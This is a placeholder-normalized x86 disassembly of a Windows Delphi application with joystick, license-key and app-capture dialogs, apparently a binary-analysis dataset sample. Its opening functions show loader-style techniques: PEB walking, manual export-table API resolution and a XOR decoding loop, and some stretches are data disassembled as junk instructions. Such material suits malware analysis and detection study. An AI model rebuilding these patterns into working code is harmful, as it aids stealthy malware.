push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_51ce90
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x13 ] 0x1
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xe ] 0x8
mov [ ebp - 0xd ] 0x8
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xb ] 0x2
mov [ ebp - 0xa ] 0x20
mov [ ebp - 0x9 ] 0x40
mov [ ebp - 0x8 ] 0x40
mov [ ebp - 0x7 ] 0x20
mov [ ebp - 0x6 ] 0x80
mov [ ebp - 0x5 ] 0x80
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov [ ebp - 0x1c ] 0x0
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x4 ]
jge rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp rwxdata
mov [ ebp - 0x15 ] 0x0
mov [ ebp - 0x20 ] 0x0
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movsx ecx [ eax ]
cmp ecx 0x20
jne rwxdata
cmp [ ebp - 0x20 ] 0x8
jge rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] 0x0
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jle rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov al [ ebp - 0x15 ]
mov [ edx ] al
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
movsx ecx [ eax ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x14 ]
and ecx eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
not eax
and ecx eax
mov [ ebp - 0x24 ] ecx
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
or ecx eax
mov [ ebp - 0x24 ] ecx
jmp rwxdata
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov cl [ ebp - 0x24 ]
mov [ ebp - 0x15 ] cl
jmp rwxdata
sub_51cfc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jge rwxdata
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
cmp eax 0x64
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
xor eax 0x80be78ab
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ecx ] al
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x1 ]
cmp edx 0x7d
jne rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x2 ]
cmp ecx 0x77
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx + 0x6 ]
cmp eax 0x61
jne rwxdata
mov ecx [ ebp - 0x4 ]
add ecx 0x3e4
mov [ ebp - 0x4 ] ecx
sub_51d050
push ebp
mov ebp esp
push ecx
mov eax [ fs : 0x30 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_51d080
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add edx [ ecx + 0x78 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x18 ]
jae rwxdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x24 ] edx
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x25 ] 0x0
je rwxdata
jmp rwxdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov dx [ eax + ecx * 2 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
add ecx [ ebp - 0x10 ]
movzx edx [ ebp - 0x1c ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
jmp rwxdata
mov [ ebp - 0x2c ] 0x0
jmp rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x1 ]
mov [ ebp - 0x26 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx + 0x1 ]
jne rwxdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne rwxdata
add [ ebp - 0x24 ] 0x2
add [ ebp - 0x20 ] 0x2
cmp [ ebp - 0x26 ] 0x0
jne rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax ]
mov [ ebp - 0x25 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx ]
jne rwxdata
sub_401000
add [ eax ] ah
nop
mov edx 0x1e000041
adc al 0x35
dec ebx
add [ eax ] al
push ds
int3
__GetExceptDLLinfo
jmp sub_4c5da8
sub_40151a
xor eax eax
mov al [ rw-data ]
retn
sub_401522
mov eax [ rw-data ]
retn
sub_4015e1
retn
sub_4015e2
cmp [ rw-data ] 0x0
jb r-xdata
retn
call sub_4015af
push [ rw-data ]
call sub_4cfd28
sub_40160c
mov eax rw-data
call sub_44b858
retn
sub_401618
mov eax rw-data
call sub_44b868
mov eax [ rw-data ]
cmp eax [ rw-data ]
je r-xdata
retn
test eax eax
je r-xdata
push eax
call FreeLibrary
sub_401729
jmp sub_448b58
sub_401730
pop ebp
retn
sub_401734
sub [ rw-data ] 0x1
retn
sub_401ce8
push rw-data
mov eax [ rw-data ]
push eax
call sub_4047f4
add esp 0x8
retn
sub_401cfc
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call sub_40480c
add esp 0x8
push ebx
call sub_401950
pop ecx
pop ebx
retn
sub_4022f8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx ecx
test ecx ecx
je r-xdata
xor eax eax
mov eax [ edx - 0x4 ]
jmp r-xdata
pop ebp
retn
sub_40323a
add [ eax ] al
sub_40330e
add [ eax ] al
call sub_47dde4
retn
sub_403784
mov eax edx
mov edx 0xffff
call sub_48e120
retn
sub_403794
mov eax edx
mov edx 0xffffff
call sub_48e120
retn
sub_403824
mov [ ecx ] 0x0
retn
sub_403898
mov [ ecx ] 0x0
retn
sub_40390c
mov [ ecx ] 0x0
retn
sub_403f6c
call sub_40323c
retn
sub_403f74
call sub_40323c
retn
sub_404064
mov edx 0x64
mov eax [ eax + 0x40c ]
call sub_4a6714
retn
sub_404078
xor edx edx
mov eax [ eax + 0x414 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
retn
sub_40408c
xor edx edx
mov eax [ eax + 0x420 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
retn
@@Assigndlg@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Assigndlg@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
sub_40444c
mov [ eax + 0x388 ] 0x2
call sub_47dde4
retn
sub_40445c
call sub_47dde4
retn
sub_404464
push ebp
mov ebp esp
movzx edx [ ecx ]
mov [ eax + 0x38c ] edx
mov [ eax + 0x388 ] 0x1
call sub_47dde4
pop ebp
retn 0x4
sub_404484
mov [ ecx ] 0x0
retn
@@Wzrddlg@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Wzrddlg@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
sub_4088dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov edx [ eax ]
mov cl [ edx + 0x15 ]
test cl cl
je r-xdata
mov eax edx
pop ebp
retn
sub_4088f4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov edx [ eax + 0x8 ]
mov cl [ edx + 0x15 ]
test cl cl
je r-xdata
mov eax edx
pop ebp
retn
@@Appinfo@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Appinfo@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
sub_409b84
push ebx
mov ebx eax
call sub_40f818
call sub_40e8e8
mov eax ebx
call sub_409ba0
call sub_40f8a0
pop ebx
retn
sub_409e24
mov eax [ edx + 0x8 ]
push eax
mov edx [ rw-data ]
push edx
call sub_411e10
add esp 0x8
retn
sub_409e38
mov eax [ edx + 0x8 ]
push eax
mov edx [ rw-data ]
push edx
call sub_411e20
add esp 0x8
retn
sub_40a004
mov eax [ rw-data ]
mov eax [ eax ]
call sub_481be0
retn
sub_40a014
mov eax [ rw-data ]
mov eax [ eax ]
call sub_481adc
retn
sub_40a070
push ebx
mov ebx eax
mov eax [ rw-data ]
push eax
call sub_4135b4
pop ecx
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_40a024
sub_40a11c
push ebx
mov ebx eax
mov eax [ ebx + 0x44c ]
mov edx [ eax ]
call [ edx + 0xdc ]
push eax
mov ecx [ rw-data ]
push ecx
call sub_4151ec
add esp 0x8
pop ebx
retn
sub_40be14
push ebp
mov ebp esp
movzx ecx [ ecx ]
cmp ecx 0xd
jne r-xdata
pop ebp
retn 0x4
call sub_40bd20
sub_40be28
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
pop ebp
retn 0x4
sub_40c830
mov edx [ eax + 0x438 ]
xor ecx ecx
mov eax edx
mov cl [ edx + 0x34 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx ecx
call sub_465f5c
retn
sub_40c84c
mov edx [ eax + 0x38c ]
xor ecx ecx
mov eax edx
mov cl [ edx + 0x34 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx ecx
call sub_465f5c
retn
sub_40c8e0
push 0x1
push 0x0
push rw-data
push rw-data
push rw-data
push 0x0
call ShellExecuteA
retn
sub_40c8fc
mov [ eax + 0x4b8 ] 0x1
call sub_47dde4
retn
sub_40cb70
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call sub_40480c
add esp 0x8
mov eax ebx
call sub_409ba0
pop ebx
retn
@@Main@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Main@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Joystick@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Joystick@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
sub_411e00
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
pop ebp
retn
sub_411e10
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax + edx + 0x2c ] 0x0
pop ebp
retn
sub_411e20
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax + edx + 0x2c ] 0x1
pop ebp
retn
sub_411e30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
add eax 0x8
mov [ eax ] 0x0
inc edx
inc eax
cmp edx 0x44
jl r-xdata
pop ebp
retn
sub_411e48
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov al [ eax + edx + 0x2c ]
pop ebp
retn
@@Configfilemanager@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Configfilemanager@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Appcapturedlg@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Appcapturedlg@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
sub_41994c
call sub_47dde4
retn
@@Applinkdlg@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Applinkdlg@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Applinkitemdlg@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Applinkitemdlg@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Applinkmanager@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Applinkmanager@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
sub_41c478
call sub_47dde4
retn
sub_41c4dc
mov eax [ eax + 0x37c ]
mov edx [ eax ]
call [ edx + 0xd8 ]
retn
sub_41c4ec
push ebp
mov ebp esp
movzx edx [ ecx ]
cmp edx 0xd
jne r-xdata
pop ebp
retn 0x4
mov [ ecx ] 0x0
call sub_47dde4
@@Namedlg@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Namedlg@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
sub_41c5c0
call sub_47dde4
retn
@@Textdlg@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Textdlg@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
sub_41cb84
push rw-data
mov eax [ rw-data ]
push eax
call sub_4047f4
add esp 0x8
retn
sub_41cb98
push rw-data
mov eax [ rw-data ]
push eax
call sub_4047f4
add esp 0x8
retn
@@Licensekeydlg@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Licensekeydlg@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Utils@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Utils@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
sub_41cf80
movzx eax ax
cmp eax 0xff
setle al
retn
sub_41d080
movzx eax ax
cmp eax 0x7f
setle al
retn
sub_41d1b9
jmp sub_448b58
sub_41d1c0
pop ebp
retn
sub_41d1c4
sub [ rw-data ] 0x1
retn
sub_41d1f1
jmp sub_448b58
sub_41d1f8
pop ebp
retn
sub_41d1fc
sub [ rw-data ] 0x1
retn
sub_41d229
jmp sub_448b58
sub_41d230
pop ebp
retn
sub_41d234
sub [ rw-data ] 0x1
retn
sub_41d261
jmp sub_448b58
sub_41d268
pop ebp
retn
sub_41d26c
sub [ rw-data ] 0x1
retn
sub_41d3cf
jmp sub_448b58
sub_41d3d6
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_41d5ba
retn
sub_41d5bb
jmp sub_448b58
j_sub_41d5ba
jmp sub_41d5ba
sub_41d5c2
pop ebp
retn
sub_41d5c4
sub [ rw-data ] 0x1
jae r-xdata
retn
xor eax eax
mov [ rw-data ] eax
sub_41d5fd
jmp sub_448b58
sub_41d604
pop ebp
retn
sub_41d608
sub [ rw-data ] 0x1
retn
sub_41da2a
jmp sub_448b58
sub_41da31
pop ebp
retn
sub_41dde6
jmp sub_448b58
sub_41dded
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41e578
jmp sub_448b58
sub_41e57f
pop ebp
retn
sub_41e584
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4331c0
mov [ rw-data ] eax
sub_41e5c5
jmp sub_448b58
sub_41e5cc
pop ebp
retn
sub_41e5d0
sub [ rw-data ] 0x1
retn
sub_41e5d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ esi ]
mov ecx 0x0
call sub_449f58
pop esi
pop ebx
retn
sub_41e5f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_449ea8
pop esi
pop ebx
retn
sub_41e604
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ esi ]
call sub_449f30
pop esi
pop ebx
retn
sub_41e618
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ esi ]
call sub_44a068
pop esi
pop ebx
retn
sub_41e644
call sub_449fd0
retn
sub_41e64c
mov edx [ edx ]
mov eax [ eax ]
xchg edx eax
call sub_44a680
retn
sub_41e658
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ esi ]
call sub_449d2c
pop esi
pop ebx
retn
sub_41e66c
push ebx
mov ebx eax
mov eax ebx
xor edx edx
call sub_449d2c
pop ebx
retn
sub_41e67c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
mov edx [ esi ]
call j_sub_44a294
sete al
pop esi
pop ebx
retn
sub_41e694
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
mov edx [ esi ]
call sub_44a294
setb al
pop esi
pop ebx
retn
sub_41e6d1
jmp sub_448b58
sub_41e6d8
pop ebp
retn
sub_41e6dc
sub [ rw-data ] 0x1
retn
sub_41e73d
jmp sub_448b58
sub_41e744
pop ebp
retn
sub_41e748
sub [ rw-data ] 0x1
retn
sub_41e775
jmp sub_448b58
sub_41e77c
pop ebp
retn
sub_41e780
sub [ rw-data ] 0x1
retn
sub_41e7ad
jmp sub_448b58
sub_41e7b4
pop ebp
retn
sub_41e7b8
sub [ rw-data ] 0x1
retn
sub_41e7e5
jmp sub_448b58
sub_41e7ec
pop ebp
retn
sub_41e7f0
sub [ rw-data ] 0x1
retn
sub_41e8da
jmp sub_448b58
sub_41e8e1
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41efc8
push sub_41f028
call GetModuleHandleW
mov [ rw-data ] eax
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_41e9b4
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
retn
sub_41f065
jmp sub_448b58
sub_41f06c
pop ebp
retn
sub_41f070
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_41efc8
sub_41f0cb
jmp sub_448b58
sub_41f0d2
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41f0f4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push ebx
push ecx
push edx
push eax
call SendMessageW
pop ebx
pop ebp
retn 0x8
sub_41f10c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push ecx
push edx
push eax
call SendMessageW
pop ebx
pop ebp
retn 0x4
sub_41f149
jmp sub_448b58
sub_41f150
pop ebp
retn
sub_41f154
sub [ rw-data ] 0x1
retn
sub_41f1c5
jmp sub_448b58
sub_41f1cc
pop ebp
retn
sub_41f1d0
sub [ rw-data ] 0x1
retn
sub_41f1fd
jmp sub_448b58
sub_41f204
pop ebp
retn
sub_41f208
sub [ rw-data ] 0x1
retn
sub_41f235
jmp sub_448b58
sub_41f23c
pop ebp
retn
sub_41f240
sub [ rw-data ] 0x1
retn
sub_41f5ec
retn
sub_41f5ed
jmp sub_448b58
j_sub_41f5ec
jmp sub_41f5ec
sub_41f5f4
pop ebp
retn
sub_41f5f8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_41f248
sub_41f7df
jmp sub_448b58
sub_41f7e6
pop ebp
retn
sub_41f7e8
sub [ rw-data ] 0x1
retn
sub_41f815
jmp sub_448b58
sub_41f81c
pop ebp
retn
sub_41f820
sub [ rw-data ] 0x1
retn
sub_41f84d
jmp sub_448b58
sub_41f854
pop ebp
retn
sub_41f858
sub [ rw-data ] 0x1
retn
sub_41f914
movzx ecx cx
or ecx 0x0
push ecx
push edx
push 0x100c
push eax
call SendMessageW
retn
sub_41fa61
jmp sub_448b58
sub_41fa68
pop ebp
retn
sub_41fa6c
sub [ rw-data ] 0x1
retn
sub_41fa99
jmp sub_448b58
sub_41faa0
pop ebp
retn
sub_41faa4
sub [ rw-data ] 0x1
retn
sub_41fc11
add eax 0xffffffdc
jmp sub_421214
sub_41fc19
add eax 0xffffffdc
jmp sub_421228
sub_41fc2b
add [ esp + 0x4 ] 0xffffffdc
jmp sub_44b9ac
sub_41fc35
add [ esp + 0x4 ] 0xffffffdc
jmp sub_44b9c0
sub_41fc3f
add eax 0xffffffd8
jmp sub_420c78
sub_41fc47
add eax 0xffffffd8
jmp sub_420dd8
sub_41fc4f
add eax 0xffffffd8
jmp sub_420f38
sub_41fc57
add eax 0xffffffd8
jmp sub_421044
sub_41fc5f
add eax 0xffffffd8
jmp sub_421130
sub_41fca9
add [ esp + 0x4 ] 0xffffffd8
jmp sub_44b9ac
sub_41fcb3
add [ esp + 0x4 ] 0xffffffd8
jmp sub_44b9c0
sub_41fcbd
add eax 0xffffffd4
jmp sub_420098
sub_41fccf
add [ esp + 0x4 ] 0xffffffd4
jmp sub_44b9ac
sub_41fcd9
add [ esp + 0x4 ] 0xffffffd4
jmp sub_44b9c0
sub_41ff0c
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ffbc
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_44b8f0
sub edx 0xffffffdc
sub_420138
jmp sub_448b58
sub_42013f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4202ac
jmp sub_448b58
sub_4202b3
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42048a
jmp sub_448b58
sub_420525
jmp sub_448b58
sub_420542
jmp sub_448b58
sub_420567
jmp sub_448b58
sub_42056e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4205ec
jmp sub_448b58
sub_4205f3
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420821
jmp sub_448b58
sub_420885
jmp sub_448b58
sub_42088c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420966
jmp sub_448b58
sub_4209b1
jmp sub_448b58
sub_4209b8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420a7f
jmp sub_448b58
sub_420a86
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420c24
jmp sub_448b58
sub_420c55
jmp sub_448b58
sub_420c5c
movzx eax [ ebp - 0x11 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_420d52
jmp sub_448b58
sub_420db8
jmp sub_448b58
sub_420dbf
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420eb2
jmp sub_448b58
sub_420f18
jmp sub_448b58
sub_420f1f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421023
jmp sub_448b58
sub_42102a
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_421110
jmp sub_448b58
sub_421117
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42111d
add [ eax ] al
add [ edx ] bl
mov ds [ edi ]
cdq
aas

sub_4211f2
jmp sub_448b58
sub_4211f9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4211ff
add [ edx ] bl
mov ds [ edi ]
cdq
aas

sub_421207
dec edx
xchg ecx eax
test al 0x4b
xchg ebp eax
xchg [ ebx + 0x408b78a8 ] edi
sbb al 0xc3
sub_421214
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x20 ]
call sub_449d2c
pop esi
pop ebx
retn
sub_4212c9
jmp sub_448b58
sub_4212d0
pop ebp
retn
sub_4212d4
sub [ rw-data ] 0x1
retn
sub_421d95
add [ esp + 0x4 ] 0xfffffff8
jmp sub_424fa8
sub_421feb
jmp [ esp + edx * 2 + 0x54a80042 ]
sub_4226e1
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
sub_422d77
push ecx
push eax
[ esi - 0x194bffbe ]
sub_422fd4
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_423048
push ecx
mov [ esp ] eax
cmp [ esp ] 0xffff
jne r-xdata
xor eax eax
pop edx
retn
cmp [ esp + 0x2 ] 0xffff
je r-xdata
mov al 0x1
pop edx
retn
sub_42312c
mov eax [ eax + 0xc ]
call sub_424590
retn
sub_4233de
jmp sub_448b58
sub_4233e5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423442
jmp sub_448b58
sub_423449
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4237b2
jmp sub_448b58
sub_4237b9
mov esp ebp
pop ebp
retn
sub_423894
add eax 0x8
push eax
call EnterCriticalSection
retn
